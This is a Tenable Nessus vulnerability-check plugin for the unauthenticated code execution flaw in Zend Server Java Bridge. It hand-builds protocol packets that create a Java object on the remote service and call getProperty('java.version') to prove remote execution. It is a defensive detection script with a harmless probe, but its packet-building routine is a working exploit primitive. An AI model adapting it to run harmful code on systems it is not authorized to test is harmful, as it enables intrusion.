#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(53533);
  script_version("$Revision: 1.8 $");
  script_cvs_date("$Date: 2016/11/15 19:41:09 $");

  script_bugtraq_id(47060);
  script_osvdb_id(71420);
  script_xref(name:"EDB-ID", value:"17078");
  script_xref(name:"EDB-ID", value:"17148");

  script_name(english:"Zend Server Java Bridge Arbitrary Java Code Execution");
  script_summary(english:"Tries to execute Java");

  script_set_attribute(
    attribute:"synopsis",
    value:"The remote service has a code execution vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"Zend Server Java Bridge, a service that lets PHP applications use
Java code, has an arbitrary code execution vulnerability.  The service
accepts requests to execute Java code without authentication. 

A remote, unauthenticated attacker could exploit this to execute
arbitrary Java code."
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.zerodayinitiative.com/advisories/ZDI-11-113/"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://seclists.org/bugtraq/2011/Mar/277"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.nessus.org/u?0c9a77c7"
  );
  script_set_attribute(
    attribute:"solution",
    value:
"Apply the hofix provided by the vendor.

If the hotfix is already applied, ensure access to the service is
restricted using the 'zend.javamw.ip' system property."
  );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"metasploit_name", value:'Zend Server Java Bridge Arbitrary Java Code Execution');
 script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"vuln_publication_date", value:"2011/03/24");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/03/24");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/04/22");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2011-2016 Tenable Network Security, Inc.");

  script_require_ports(10001);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("byte_func.inc");


global_var port;

##
# makes a CreateObject request packet
#
# @anonparam  class  class name of the instance to be created
#
# @return a CreateObject packet
##
function create_object_req()
{
  local_var class, action, req;
  class = _FCT_ANON_ARGS[0];
  action = 'CreateObject';

  req =
    '\x00\x00\x00\x00' + # ?
    mkdword(strlen(action)) + action +
    '\x00\x00\x00\x02' + # ?
    '\x04' + # ?
    mkdword(strlen(class)) + class +
    '\x07' + # ?
    '\x00\x00\x00\x00';
  req = make_request(req);

  return req;
}

##
# makes a request packet for invoking a method
#
# @param  obj_id  object ID of the instance containing the method to be invoked
# @param  method  the method to invoke
# @param  arg     the argument to pass to 'method' (assumes there is one arg and it's a string)
#
# @return a method invocation request packet
##
function invoke_method_req(obj_id, method, arg)
{
  local_var req;

  req =
    obj_id +
    mkdword(strlen(method)) + method +
    '\x00\x00\x00\x01' + # ?
    '\x04' + # ?
    mkdword(strlen(arg)) + arg;
  req = make_request(req);

  return req;
}

##
# Creates a Java Bridge request packet (adds a 4 byte size header)
#
# @anonparam  payload  payload of the request packet to create
#
# @return the generated request packet
##
function make_request()
{
  local_var payload, req;
  payload = _FCT_ANON_ARGS[0];
  req = mkdword(strlen(payload)) + payload;

  return req;
}

##
# Processes a Java Bridge response packet (strips the header and returns the payload)
#
# This function will exit() if it encounters any errors
#
# @anonparam  sock  socket where the response data can be read from
#
# @return the data received from the server, minus the header
##
function process_response()
{
  local_var sock, len, data;
  sock = _FCT_ANON_ARGS[0];

  len = recv(socket:sock, length:4);
  if (strlen(len) != 4)
    exit(1, 'Error reading packet length from port ' + port + '.');

  len = getdword(blob:len, pos:0);
   
  #
  # Do not process responses bigger than 10Mb
  #
  if ( len >= 10*1024*1024 ) 
    exit(1, 'Packet length advertised on port ' + port + ' is too big.');

  data = recv(socket:sock, length:len);
  if (strlen(data) != len)
    exit(1, 'Unexpected amount of data received from port ' + port + '.');

  return data;
}


# plugin starts here

# The patch makes the service listen on localhost rather than
# all interfaces, so we'll skip localhost to avoid FPs
if (islocalhost()) exit(1, 'Can\'t test against localhost.');

port = 10001;
if (known_service(port:port)) exit(0, 'The service on port '+port+' was already identified.');
if (!get_tcp_port_state(port)) exit(0, "Port "+port+" is not open.");

soc = open_sock_tcp(port);
if (!soc)
exit(1, "Failed to open a socket on port "+port+".");

# first create the object
# $system = new Java("java.lang.System")
class = 'java.lang.System';
new_req = create_object_req(class);
send(socket:soc, data:new_req);
res = process_response(soc);
if (strlen(res) != 5 || res[0] != '\x05')
  exit(0, 'Unexpected response to first request from port '+port+' (probably not Java Bridge).');

object_id = substr(res, 1, 4);

# Then invoke a method, proving we can execute arbitrary Java
# $system->getProperty("java.version")
method = 'getProperty';
arg = 'java.version';
req = invoke_method_req(obj_id:object_id, method:method, arg:arg);
send(socket:soc, data:req);
res = process_response(soc);

# Clean up (deallocate/GC/whatever our object and send a 'reset')
req = '\xff\xff\xff\xff' + mkdword(strlen('delObject')) + 'delObject' + '\x00\x00\x00\x01\x02' + object_id;
req = make_request(req);
send(socket:soc, data:req);
del_res = recv(socket:soc, length:5);

# should return a pkt header + null byte. if we get something
# unexpected, close the socket without sending the reset
if (isnull(del_res) || strlen(del_res) != 5 || del_res[4] != '\x00')
{
  close(soc);
}
else
{
  req = '\xff\xff\xff\xff' + mkdword(strlen('reset')) + 'reset' + '\x00\x00\x00\x00';
  req = make_request(req);
  send(socket:soc, data:req);
  rst_res = recv(socket:soc, length:5);
  # the server should return a pkt header + null byte,
  # but we don't care what it does at this point
  close(soc);
}

# Check the response from the method invocation
if (res[0] != '\x04')
  exit(1, 'Unexpected response to getProperty() on port '+port+'.');

ver_len = getdword(blob:res, pos:1);
ver = substr(res, 5, 4 + ver_len);

if (ver_len != strlen(ver))
  exit(1, 'Unexpected packet size in getProperty() response on port '+port+'.');

# If we made it this far, we successfully executed the method,
# which also means we've detected the service
register_service(port:port, proto:"java_bridge");

if (report_verbosity > 0)
{
  report =
    '\nNessus was able to get the JRE version number by executing Java' +
    '\non the remote host :\n' +
    '\n  Method call  : ' + class +'.'+ method+'("'+arg+'")' +
    '\n  Return value : ' + ver + '\n';
  security_hole(port:port, extra:report);
}
else security_hole(port);
